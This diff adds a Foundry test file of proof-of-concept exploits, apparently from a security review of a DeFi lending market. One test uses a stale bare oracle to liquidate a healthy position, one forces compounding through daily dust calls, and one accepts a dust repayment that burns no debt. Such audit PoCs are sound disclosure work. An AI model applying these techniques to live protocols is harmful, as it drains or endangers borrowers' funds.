@@ -1,0 +1,165 @@
+// SPDX-License-Identifier: Apache-2.0
+pragma solidity ^0.8.20;
+
+import {Test} from "forge-std/Test.sol";
+import {LendingMarket, IERC20} from "../../src/LendingMarket.sol";
+import {HLPriceGuard} from "hl-price-guard/HLPriceGuard.sol";
+
+/// @dev Minimal USDC used to exercise the market's accounting at its native six-decimal unit.
+contract PocUSDC {
+    mapping(address => uint256) public balanceOf;
+    mapping(address => mapping(address => uint256)) public allowance;
+
+    function mint(address to, uint256 amount) external { balanceOf[to] += amount; }
+    function approve(address spender, uint256 amount) external returns (bool) {
+        allowance[msg.sender][spender] = amount;
+        return true;
+    }
+    function transfer(address to, uint256 amount) external returns (bool) {
+        balanceOf[msg.sender] -= amount;
+        balanceOf[to] += amount;
+        return true;
+    }
+    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
+        allowance[from][msg.sender] -= amount;
+        balanceOf[from] -= amount;
+        balanceOf[to] += amount;
+        return true;
+    }
+}
+
+contract LendingMarketRound1PoC is Test {
+    address internal constant MARK_PX = 0x0000000000000000000000000000000000000806;
+    address internal constant ORACLE_PX = 0x0000000000000000000000000000000000000807;
+    address internal constant BBO = 0x000000000000000000000000000000000000080e;
+    uint32 internal constant HYPE_PERP = 135;
+
+    PocUSDC internal usdc;
+
+    function setUp() public {
+        usdc = new PocUSDC();
+    }
+
+    function _market() internal returns (LendingMarket) {
+        return new LendingMarket(IERC20(address(usdc)), 0, HYPE_PERP, 2, 100, 100, 100);
+    }
+
+    function _setQuote(uint64 oracle4, uint64 mark4, uint64 bid4, uint64 ask4) internal {
+        vm.mockCall(ORACLE_PX, abi.encode(HYPE_PERP), abi.encode(oracle4));
+        vm.mockCall(MARK_PX, abi.encode(HYPE_PERP), abi.encode(mark4));
+        vm.mockCall(BBO, abi.encode(HYPE_PERP), abi.encode(bid4, ask4));
+    }
+
+    function _approveAndSupply(LendingMarket market, address lender, uint256 amount) internal {
+        usdc.mint(lender, amount);
+        vm.startPrank(lender);
+        usdc.approve(address(market), type(uint256).max);
+        market.supply(amount);
+        vm.stopPrank();
+    }
+
+    /// @notice A bad/stale bare oracle can liquidate a position that the guarded path refuses
+    /// to treat as priceable. At the still-current $40 mark, the borrower is exactly 60% LTV.
+    function test_POC_bareOracleLetsLiquidatorTakeHealthyCollateral() public {
+        LendingMarket market = _market();
+        address lender = address(0x1);
+        address borrower = address(0x2);
+        address liquidator = address(0x3);
+        _setQuote(40e4, 40e4, 39.99e4, 40.01e4);
+        _approveAndSupply(market, lender, 1_000e6);
+
+        vm.deal(borrower, 10 ether);
+        vm.startPrank(borrower);
+        usdc.approve(address(market), type(uint256).max);
+        market.depositCollateral{value: 10 ether}();
+        market.borrow(240e6);
+        vm.stopPrank();
+
+        // The oracle alone reports a 25% crash. The mark and executable book remain at $40.
+        _setQuote(30e4, 40e4, 39.99e4, 40.01e4);
+        vm.expectRevert(
+            abi.encodeWithSelector(HLPriceGuard.PriceRejected.selector, HLPriceGuard.Breach.MarkOracle, 3_334, 100)
+        );
+        market.guardedPrice();
+
+        usdc.mint(liquidator, 120e6);
+        vm.startPrank(liquidator);
+        usdc.approve(address(market), type(uint256).max);
+        uint256 seized = market.liquidate(borrower, type(uint256).max);
+        vm.stopPrank();
+
+        // The liquidator pays $120 and receives 4.2 HYPE, worth $168 at the live book/mark.
+        assertEq(seized, 4.2 ether);
+        assertEq(liquidator.balance, 4.2 ether);
+        assertEq(market.debtOf(borrower), 120e6);
+        assertEq(market.collateral(borrower), 5.8 ether);
+    }
+
+    /// @notice The interest charged over a year is selected by how often *anyone* calls a
+    /// state-changing function. A griefing third party can use one USDC base unit per day to
+    /// turn a quoted 100% simple annual charge into almost 172%.
+    function test_POC_externalCallsForceCompoundingAndLiquidationRisk() public {
+        LendingMarket oneShot = _market();
+        LendingMarket forced = _market();
+        address lender = address(0x10);
+        address borrower = address(0x20);
+        address griefer = address(0x30);
+        _setQuote(40e4, 40e4, 39.99e4, 40.01e4);
+
+        _approveAndSupply(oneShot, lender, 1_000e6);
+        _approveAndSupply(forced, lender, 1_000e6);
+        vm.deal(borrower, 200 ether);
+        vm.startPrank(borrower);
+        oneShot.depositCollateral{value: 75 ether}();
+        forced.depositCollateral{value: 75 ether}();
+        oneShot.borrow(1_000e6); // 100% utilisation, therefore a 100% annual rate
+        forced.borrow(1_000e6);
+        vm.stopPrank();
+
+        usdc.mint(griefer, 365);
+        vm.startPrank(griefer);
+        usdc.approve(address(forced), type(uint256).max);
+        for (uint256 i; i < 365; ++i) {
+            skip(1 days);
+            // supply accrues before it pulls this one base unit (0.000001 USDC).
+            forced.supply(1);
+        }
+        vm.stopPrank();
+
+        uint256 forcedDebt = forced.debtOf(borrower);
+        // oneShot is evaluated after the same elapsed time, so it accrues only once: 1,000 -> 2,000.
+        uint256 oneShotDebt = oneShot.debtOf(borrower);
+        assertApproxEqAbs(oneShotDebt, 2_000e6, 2);
+        assertGt(forcedDebt, 2_700e6);
+        assertGt(forcedDebt - oneShotDebt, 700e6);
+        // With $3,000 of collateral, the single accrual remains healthy (66.67% LTV),
+        // while the griefer-controlled cadence makes the identical loan liquidatable (>90%).
+        assertLt(oneShot.ltvBps(borrower, 40e18), 7_500);
+        assertGt(forced.ltvBps(borrower, 40e18), 7_500);
+    }
+
+    /// @notice Once the borrow index is above 1e18, a one-base-unit repayment is accepted and
+    /// transferred although amount * WAD / index is zero and no debt share is burned.
+    function test_POC_dustRepaymentTransfersUSDCWithoutReducingDebt() public {
+        LendingMarket market = _market();
+        address lender = address(0x101);
+        address borrower = address(0x202);
+        _setQuote(40e4, 40e4, 39.99e4, 40.01e4);
+        _approveAndSupply(market, lender, 1_000e6);
+
+        vm.deal(borrower, 10 ether);
+        vm.startPrank(borrower);
+        usdc.approve(address(market), type(uint256).max);
+        market.depositCollateral{value: 10 ether}();
+        market.borrow(100e6);
+        uint256 sharesBefore = market.debtShares(borrower);
+        uint256 usdcBefore = usdc.balanceOf(borrower);
+        skip(1);
+        uint256 paid = market.repay(borrower, 1); // one USDC base unit = 0.000001 USDC
+        vm.stopPrank();
+
+        assertEq(paid, 1);
+        assertEq(usdc.balanceOf(borrower), usdcBefore - 1);
+        assertEq(market.debtShares(borrower), sharesBefore);
+    }
+}
